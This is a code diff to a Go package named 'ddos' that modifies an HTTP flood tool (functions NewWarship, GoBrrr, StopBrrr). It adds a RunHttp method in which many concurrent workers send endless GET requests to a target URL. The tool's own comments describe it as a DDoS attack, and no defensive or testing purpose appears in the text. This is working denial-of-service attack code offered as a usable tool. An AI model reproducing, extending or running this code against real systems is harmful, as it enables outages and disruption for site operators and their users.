@@ -1,10 +1,10 @@
 package ddos
 
 import (
-	"crypto/tls"
 	"fmt"
 	"math/rand"
 	"net"
+	"net/http"
 	"net/url"
 	"runtime"
 	"sync/atomic"
@@ -24,7 +24,7 @@ type Client struct {
 	Timeout        time.Duration
 	BytesRead      int64
 	BytesWritten   int64
-	ddos           *DDoS
+	Ddos           *DDoS
 	SuccessRequest int64
 	AmountRequests int64
 }
@@ -43,32 +43,32 @@ func NewWarship(target string, workers int) *Client {
 func (c *Client) GoBrrr() {
 	go func() {
 		for {
-			client := &fasthttp.Client{
-				ReadTimeout:                   c.Timeout,
-				WriteTimeout:                  c.Timeout,
-				DisableHeaderNamesNormalizing: true,
-				TLSConfig:                     &tls.Config{InsecureSkipVerify: true},
-				Dial: fasthttpDialFunc(
-					&c.BytesRead, &c.BytesWritten,
-				),
-			}
+			//client := &fasthttp.Client{
+			//	ReadTimeout:                   c.Timeout,
+			//	WriteTimeout:                  c.Timeout,
+			//	DisableHeaderNamesNormalizing: true,
+			//	TLSConfig:                     &tls.Config{InsecureSkipVerify: true},
+			//	Dial: fasthttpDialFunc(
+			//		&c.BytesRead, &c.BytesWritten,
+			//	),
+			//}
 			d, err := New(c.Target, c.Workers)
 			if err != nil {
 				panic(err)
 			}
-			c.ddos = d
+			c.Ddos = d
 
-			c.ddos.Run(client)
-			time.Sleep(time.Second * 3)
-			c.ddos.Stop()
-			c.SuccessRequest += c.ddos.SuccessRequest
-			c.AmountRequests += c.ddos.SuccessRequest
+			// c.Ddos.Run(client)
+			c.Ddos.RunHttp()
+			time.Sleep(time.Millisecond * 10)
+			c.SuccessRequest += c.Ddos.SuccessRequest
+			c.AmountRequests += c.Ddos.SuccessRequest
 		}
 	}()
 }
 
 func (c *Client) StopBrrr() {
-	c.ddos.Stop()
+	c.Ddos.Stop()
 }
 
 // DDoS - structure of value for DDoS attack
@@ -141,6 +141,29 @@ func (d *DDoS) Run(client *fasthttp.Client) {
 	}
 }
 
+func (d *DDoS) RunHttp() {
+	for i := 0; i < d.amountWorkers; i++ {
+		go func() {
+			for {
+				select {
+				case <-(*d.stop):
+					return
+				default:
+					// sent http GET requests
+					_, err := http.Get(d.url)
+					// atomic.AddInt64(&d.AmountRequests, 1)
+					d.AmountRequests += 1
+					if err == nil {
+						// atomic.AddInt64(&d.SuccessRequest, 1)
+						d.SuccessRequest += 1
+					}
+				}
+				runtime.Gosched()
+			}
+		}()
+	}
+}
+
 // Stop - stop DDoS attack
 func (d *DDoS) Stop() {
 	for i := 0; i < d.amountWorkers; i++ {
@@ -176,6 +199,10 @@ func sendGetRequest(url string, client *fasthttp.Client) (int, error) {
 	fasthttp.ReleaseRequest(req)
 	fasthttp.ReleaseResponse(resp)
 	return code, nil
+}
+
+func (d *DDoS) Result() (successRequest, amountRequests int64) {
+	return d.SuccessRequest, d.AmountRequests
 }
 
 func getUserAgent() string {
